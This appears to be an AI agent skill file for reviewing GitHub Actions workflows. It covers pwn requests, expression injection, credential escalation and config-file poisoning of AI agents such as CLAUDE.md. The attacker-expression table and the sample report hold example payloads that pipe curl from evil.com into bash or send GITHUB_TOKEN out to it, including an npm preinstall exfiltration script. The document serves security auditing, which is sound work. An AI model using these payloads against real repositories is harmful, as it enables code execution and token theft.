---
name: gha-security-review
description: 'GitHub Actions security review for workflow exploitation vulnerabilities. Use when asked to "review GitHub Actions", "audit workflows", "check CI security", "GHA security", "workflow security review", or review .github/workflows/ for pwn requests, expression injection, credential theft, and supply chain attacks. Exploitation-focused with concrete PoC scenarios.'
allowed-tools: Read, Grep, Glob, Bash, Task
---

<!--
Attack patterns and real-world examples sourced from the HackerBot Claw campaign analysis
by StepSecurity (2025): https://www.stepsecurity.io/blog/hackerbot-claw-github-actions-exploitation
-->

# GitHub Actions Security Review

Find exploitable vulnerabilities in GitHub Actions workflows. Every finding MUST include a concrete exploitation scenario — if you can't build the attack, don't report it.

## Core Principles

### Exploitation over theory

For each finding, you must provide:

1. **Entry point** — How does the attacker get in? (fork PR, issue comment, branch name, etc.)
2. **Payload** — What does the attacker send? (actual code/YAML/input)
3. **Execution mechanism** — How does the payload run? (expression expansion, checkout + script, etc.)
4. **Impact** — What does the attacker gain? (token theft, code execution, repo write access)
5. **PoC sketch** — A concrete step-by-step an attacker would follow

If you cannot construct all five elements, downgrade to "Needs Verification" — do not report as a confirmed finding.

### External attacker threat model

Only report vulnerabilities exploitable by someone **without existing write access** to the repository. If a vulnerability requires the attacker to already have write/admin access (e.g., triggering `workflow_dispatch`, pushing to a protected branch), it is **not a finding** — someone with write access can already push arbitrary code directly.

This means **do not flag**:
- `workflow_dispatch` input injection — requires write access to trigger
- Expression injection in `push`-only workflows on protected branches — requires write access to push
- `workflow_call` input injection where all callers are internal — no external entry point
- Secrets in `workflow_dispatch`/`schedule`-only workflows — only maintainers can trigger

The threat model is: **anonymous user or fork PR author** who can open PRs, create issues, or post comments — but cannot push to branches or trigger manual workflows.

### Validate before reporting

Before including any finding in the report, you MUST prove it is real by reading the actual workflow YAML and tracing the complete attack path. Pattern matching is not enough — you must confirm every link in the chain:

1. **Read the workflow file** — don't rely on grep output alone. Read the full YAML to understand job structure, conditions, and step ordering.
2. **Trace the trigger** — confirm the workflow actually fires on the event you think it does. Check `if:` conditions on jobs and steps that might gate execution.
3. **Trace the expression** — for injection findings, confirm the `${{ }}` expression actually appears inside a `run:` block (not `if:`, `with:`, or `env:` at job level). Read the surrounding lines.
4. **Trace the checkout** — for pwn requests, confirm `actions/checkout` actually references the fork's ref (`head.sha`, `head.ref`), not just the base branch.
5. **Confirm the value is attacker-controlled** — verify the expression maps to something an external attacker can set (PR title, branch name, comment body), not something that requires write access.
6. **Check for existing mitigations** — look for `if:` conditions that restrict execution, `author_association` checks, environment variable wrapping, or permissions that limit impact.

If any link in the chain is broken or uncertain, the finding is **not confirmed**. Move it to "Needs Verification" with a note about what couldn't be confirmed.

---

## Scope

### Files to Review

- `.github/workflows/*.yml` — all workflow definitions
- `action.yml` / `action.yaml` — composite actions in the repo
- `.github/actions/*/action.yml` — local reusable actions
- Reusable workflows referenced via `uses: ./.github/workflows/`
- Config files loaded by workflows: `CLAUDE.md`, `AGENTS.md`, `Makefile`, shell script files under `.github/`

### Out of Scope

- Workflows in other repositories (only note the dependency)
- GitHub App installation permissions (note if relevant)

---

## Do Not Flag (Safe Patterns)

Before reporting, check if the pattern is actually safe:

| Pattern | Why It's Safe |
|---------|---------------|
| `pull_request_target` WITHOUT `actions/checkout` of fork code | Never executes attacker code |
| `${{ github.event.pull_request.number }}` in `run:` | Numeric only — not injectable |
| `${{ github.repository }}` | Controlled by repo owner, not attacker |
| `${{ secrets.GITHUB_TOKEN }}` | Not an expression injection vector |
| `${{ }}` in `if:` conditions | Evaluated by Actions runtime, not shell |
| `${{ }}` in `with:` inputs | Passed as string parameters, not shell-evaluated |
| Actions pinned to full SHA (`uses: actions/checkout@8e5e7e5a...`) | Immutable reference |
| `pull_request` trigger (not `_target`) | Runs in fork context with read-only token |
| `${{ github.event.pull_request.head.sha }}` used only in `if:` | Not shell-expanded |
| `${{ github.event.inputs.* }}` in `workflow_dispatch` workflows | Requires write access to trigger — not an external threat |
| `${{ github.event.commits[*].message }}` on `push` to protected branches | Requires write access to push — not an external threat |
| Any expression in a `workflow_dispatch`-only or `schedule`-only workflow | No external attacker can trigger these |

**Key distinction:** `${{ }}` is dangerous in `run:` blocks (shell expansion) but safe in `if:`, `with:`, and `env:` at the job/step level (Actions runtime evaluation).

**Key distinction:** An injectable expression only matters if an **external attacker** can control the value. If triggering the workflow already requires write access, the injection adds no additional risk.

---

## Review Process

### Phase 1: Discover Workflow Files

```bash
# Find all workflow and action files
find .github -name "*.yml" -o -name "*.yaml" 2>/dev/null
find . -name "action.yml" -o -name "action.yaml" -not -path "*/node_modules/*" 2>/dev/null
```

Create an inventory of all workflow files with their triggers.

### Phase 2: Classify Triggers by Risk

For each workflow, identify triggers and load the appropriate references:

| Trigger | Risk Level | References to Load |
|---------|------------|-------------------|
| `pull_request_target` | **Critical** | `references/pwn-request.md` |
| `issue_comment` with command parsing | **High** | `references/comment-triggered-commands.md` |
| `issues` / `pull_request` with `${{ }}` in `run:` | **High** | `references/expression-injection.md` |
| Any workflow using PATs/deploy keys accessible to untrusted code | **High** | `references/credential-escalation.md` |
| Workflows that checkout PR code + read config files | **Medium** | `references/ai-prompt-injection-via-ci.md` |
| Workflows using third-party actions (especially unpinned) | **Medium** | `references/supply-chain.md` |
| Workflows with `permissions:` block or secrets | **Medium** | `references/permissions-and-secrets.md` |
| Self-hosted runners or cache/artifact usage | **Medium** | `references/runner-infrastructure.md` |
| `workflow_dispatch` / `schedule` / `push` to protected branches | **Skip** | Requires write access — not an external threat. Do not analyze for injection. |

**Load references selectively** — only load what's relevant to the triggers found.

### Phase 3: Analyze Each Workflow

For every workflow, run through these 8 checks:

#### Check 1: Pwn Request
Does the workflow use `pull_request_target` AND check out fork code?
- Look for `actions/checkout` with `ref:` pointing to PR head
- Look for local actions (`./.github/actions/`) that would come from the fork
- Check if any `run:` step executes code from the checked-out PR

#### Check 2: Expression Injection
Are `${{ }}` expressions used inside `run:` blocks in workflows triggerable by external attackers?
- Map every `${{ }}` expression in every `run:` step
- Cross-reference against the Attacker-Controlled Expressions table below
- **Skip** `workflow_dispatch` inputs — these require write access and are not an external threat
- **Skip** expressions in workflows that only trigger on `push` to protected branches or `schedule`
- Only flag expressions where an **external attacker** (fork PR author, issue creator, commenter) controls the value

#### Check 3: Unauthorized Command Execution
Does an `issue_comment`-triggered workflow execute commands without authorization?
- Is there an `author_association` check?
- Can any GitHub user trigger the command?
- Does the command handler also use injectable expressions?

#### Check 4: Credential Escalation
Are elevated credentials (PATs, deploy keys) accessible to untrusted code?
- What's the blast radius of each secret?
- Could a compromised workflow steal long-lived tokens?

#### Check 5: Config File Poisoning
Does the workflow load configuration from PR-supplied files?
- `CLAUDE.md`, `AGENTS.md`, `.cursorrules` — AI agent instructions
- `Makefile`, shell scripts — build configuration
- Any file that changes behavior when modified by a PR

#### Check 6: Supply Chain
Are third-party actions securely pinned?
- Read `references/supply-chain.md` for unpinned action risks

#### Check 7: Permissions and Secrets
Are workflow permissions minimal? Are secrets properly scoped?
- Read `references/permissions-and-secrets.md` for permission analysis

#### Check 8: Runner Infrastructure
Are self-hosted runners, caches, or artifacts used securely?
- Read `references/runner-infrastructure.md` for runner risks

### Phase 4: Build Exploitation Scenario

For each potential finding, construct the full attack:

```
ATTACK: [Name]
ENTRY: [How attacker initiates — e.g., "Open PR from fork with modified .github/check.go"]
PAYLOAD: [Exact content attacker provides]
TRIGGER: [What causes execution — e.g., "Workflow runs on pull_request_target"]
EXECUTION: [How payload runs — e.g., "go run executes init() before main()"]
IMPACT: [What attacker gains — e.g., "GITHUB_TOKEN with contents:write exfiltrated"]
```

If you cannot fill in all fields with concrete values, the finding is not confirmed.

### Phase 5: Validate and Verify

**Every finding must survive this gauntlet before being reported.** Read the actual workflow YAML (don't rely on search snippets) and confirm each point:

#### 5a: Prove the attack path exists

| Check | How to Validate | If It Fails |
|-------|----------------|-------------|
| Trigger is externally accessible | Workflow uses `pull_request_target`, `issue_comment`, `issues`, or `pull_request` — NOT only `workflow_dispatch`/`schedule`/`push` to protected branch | Drop the finding |
| Expression is in a shell context | The `${{ }}` appears inside a `run:` block, not in `if:`, `with:`, or job-level `env:` | Drop the finding |
| Value is attacker-controlled | Expression maps to PR title, body, branch name, comment body, etc. — not to `number`, `sha`, `repository` | Drop the finding |
| Checkout references fork code | `actions/checkout` uses `ref: ${{ github.event.pull_request.head.sha }}` or `.head.ref` | Drop the finding (for pwn request) |
| Code executes after checkout | A `run:` step or local action usage follows the checkout | Drop the finding (for pwn request) |

#### 5b: Check for existing mitigations

- **Does exploiting this require write access?** If the only trigger is `workflow_dispatch`, `schedule`, or `push` to a protected branch, **drop the finding entirely** — it is not an external threat.
- Is the expression wrapped in an environment variable? (`env: TITLE: ${{ ... }}` then `"$TITLE"`)
- Is there an `author_association` check before command execution?
- Does the workflow use `pull_request` instead of `pull_request_target`?
- Are permissions explicitly restricted to read-only?
- Is the action pinned to a full SHA?
- Do `if:` conditions on the job or step gate execution in a way that blocks the attack?

If mitigations exist, re-evaluate whether the attack still works. Drop the finding if mitigated.

#### 5c: Confirm impact is real

- What permissions does `GITHUB_TOKEN` have in this workflow? (Check `permissions:` block, or note if using repo default)
- Are secrets actually accessible to the compromised step?
- Could the attacker actually exfiltrate data? (Check for network restrictions, ephemeral runners)

If the impact is negligible (e.g., read-only token, no secrets, ephemeral runner), downgrade severity accordingly.

### Phase 6: Report

Generate the output in the format specified below. Include:
1. Workflow inventory table
2. Confirmed findings with full exploitation scenarios
3. "Needs Verification" items
4. "Reviewed and Cleared" section listing safe workflows

---

## Attacker-Controlled Expressions

These expressions are **dangerous when used in `run:` blocks** because an attacker controls the value:

| Expression | Attack Vector | Example Payload |
|------------|--------------|-----------------|
| `github.event.pull_request.title` | PR title | `"; curl evil.com/steal \| bash #` |
| `github.event.pull_request.body` | PR description | Shell commands in markdown |
| `github.event.pull_request.head.ref` | Branch name | `dev$(curl evil.com\|bash)` |
| `github.event.pull_request.head.label` | Fork label | Same as branch name |
| `github.event.issue.title` | Issue title | Shell injection via title |
| `github.event.issue.body` | Issue body | Shell commands |
| `github.event.comment.body` | Comment text | Commands in comments |
| `github.event.review.body` | Review text | Shell injection |
| `github.event.discussion.title` | Discussion title | Shell injection |
| `github.event.discussion.body` | Discussion body | Shell injection |
| `github.head_ref` | Branch name (shorthand) | `dev$(malicious_cmd)` |
| `github.event.pages.*.page_name` | Wiki page name | Shell injection |

### Safe Expressions (NOT attacker-controlled)

| Expression | Why Safe |
|------------|----------|
| `github.event.pull_request.number` | Numeric only |
| `github.repository` | Repo owner controls this |
| `github.repository_owner` | Repo owner controls this |
| `github.actor` | GitHub username, alphanumeric + hyphens |
| `github.sha` | Hex string |
| `github.ref_name` (on `push` to protected branch) | Protected branch rules apply |
| `secrets.*` | Not expanded into shell literally |
| `github.run_id` / `github.run_number` | Numeric |
| `github.event.pull_request.merged` | Boolean |
| `github.event.workflow_dispatch.inputs.*` | Requires write access to trigger — not an external threat |
| `github.event.commits[*].message` | On `push` to protected branches, requires write access |
| `github.event.commits[*].author.name` | On `push` to protected branches, requires write access |

---

## Quick Patterns Reference

### Always Flag (Critical)

```yaml
# Pwn Request: checkout fork code with elevated permissions
on: pull_request_target
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # FORK CODE
      - run: npm install && npm test  # Executes attacker's package.json

# Expression injection: attacker-controlled value in run block
- run: echo "${{ github.event.pull_request.title }}"
  # Attacker sets title to: "; curl https://evil.com | bash #

# PAT accessible to fork code
on: pull_request_target
env:
  TOKEN: ${{ secrets.DEPLOY_PAT }}
steps:
  - uses: actions/checkout@v4
    with:
      ref: ${{ github.event.pull_request.head.ref }}
  - run: ./build.sh  # Fork's build.sh can read $TOKEN
```

### Always Flag (High)

```yaml
# Comment command without author check
on: issue_comment
jobs:
  handle:
    if: contains(github.event.comment.body, '/deploy')
    # Missing: github.event.comment.author_association check
    steps:
      - run: ./deploy.sh
```

### Do NOT Flag (Requires Write Access)

```yaml
# workflow_dispatch inputs — triggerer already has write access
on:
  workflow_dispatch:
    inputs:
      name:
        description: 'Name to greet'
- run: echo "Hello ${{ github.event.inputs.name }}"
  # NOT a finding: requires write access to trigger

# push to protected branches — pusher already has write access
on:
  push:
    branches: [main]
- run: echo "${{ github.event.commits[0].message }}"
  # NOT a finding: requires write access to push
```

### Check Context First

```yaml
# pull_request_target WITHOUT fork checkout — SAFE
on: pull_request_target
jobs:
  label:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/labeler@v5  # Only reads PR metadata, no fork code

# Expression in if: condition — SAFE (not shell-expanded)
if: ${{ github.event.pull_request.title != '' }}

# Expression in with: — SAFE (passed as parameter, not shell)
- uses: some-action@v1
  with:
    title: ${{ github.event.pull_request.title }}
```

---

## Severity Model

| Severity | Criteria | Examples |
|----------|----------|---------|
| **Critical** | RCE + write token theft; full repo compromise possible | Pwn request with PAT theft; expression injection with `contents: write` |
| **High** | RCE with limited impact; credential exposure without write access | Expression injection with read-only token; unpinned action with secrets in externally-triggerable workflow |
| **Medium** | Requires specific conditions; limited blast radius | Comment command without auth check (but no secrets exposed); unpinned action from less-known org |
| **Low** | Defense-in-depth; no direct exploitation path | Overly broad permissions but no reachable attack; missing SHA pin on official action |
| **Not a finding** | Requires write access to exploit | `workflow_dispatch` input injection; `push`-only expression injection; secrets in maintainer-only workflows |

---

## Output Format

```markdown
## GitHub Actions Security Review

### Workflow Inventory

| File | Triggers | Permissions | Risk Level |
|------|----------|-------------|------------|
| `.github/workflows/ci.yml` | `push`, `pull_request` | `contents: read` | Low |
| `.github/workflows/release.yml` | `pull_request_target` | `contents: write` | Critical |

### Findings

#### [GHA-001] Pwn Request via Fork Checkout (Critical)
- **Workflow**: `.github/workflows/release.yml:15`
- **Trigger**: `pull_request_target`
- **Exploitation Scenario**:
  1. Attacker forks the repository
  2. Modifies `package.json` to add `preinstall` script: `curl https://evil.com/$GITHUB_TOKEN`
  3. Opens PR — workflow checks out fork code at line 22
  4. `npm install` at line 25 executes the preinstall script
  5. `GITHUB_TOKEN` with `contents: write` is exfiltrated
- **Impact**: Attacker gains write access to repository contents
- **Fix**: Split into two workflows — use `pull_request` for building, `workflow_run` for trusted operations

#### [GHA-002] Expression Injection in PR Title (High)
- **Workflow**: `.github/workflows/greet.yml:10`
- **Expression**: `${{ github.event.pull_request.title }}`
- **Exploitation Scenario**:
  1. Attacker opens PR with title: `"; curl https://evil.com/$(cat $GITHUB_TOKEN) #`
  2. Shell interprets the title as code at line 10
  3. Token exfiltrated via HTTP request
- **Impact**: GITHUB_TOKEN leaked (permissions depend on workflow config)
- **Fix**: Use environment variable:
  ```yaml
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "$PR_TITLE"
  ```

### Needs Verification
[Items where exploitation scenario is incomplete]

### Reviewed and Cleared
- `.github/workflows/ci.yml` — uses `pull_request` trigger, no expression injection, actions pinned to SHA
- `.github/workflows/lint.yml` — read-only permissions, no secrets, no injectable expressions
```

If no findings: "No exploitable vulnerabilities identified in GitHub Actions workflows. All workflows reviewed and cleared."

---

## Reference Files

Load these selectively based on triggers and patterns found during analysis.

### Deep-Dive Patterns (`references/`)

| File | Load When | Content |
|------|-----------|---------|
| `pwn-request.md` | `pull_request_target` found | Untrusted checkout, Go init()/npm preinstall/setup.py vectors, workflow_run split |
| `expression-injection.md` | `${{ }}` in `run:` blocks | Branch name injection, filename injection, base64 payloads, env var fix |
| `comment-triggered-commands.md` | `issue_comment` with command parsing | Author association checks, compound injection risks |
| `credential-escalation.md` | PATs/deploy keys/elevated perms | Token blast radius, minimal permission patterns |
| `ai-prompt-injection-via-ci.md` | Config files loaded from PR context | CLAUDE.md poisoning, tool allowlisting defense |
| `real-world-attacks.md` | Any finding confirmed | 7 documented attacks from the HackerBot Claw campaign |

### Broader Security (`references/`)

| File | Load When | Content |
|------|-----------|---------|
| `supply-chain.md` | Third-party actions found | Unpinned actions, tag mutation, actions that curl\|bash |
| `permissions-and-secrets.md` | `permissions:` or secrets usage found | Overly broad perms, secret leakage, OIDC misconfiguration |
| `runner-infrastructure.md` | Self-hosted runners or cache/artifact usage | Runner persistence, cache poisoning, artifact poisoning |
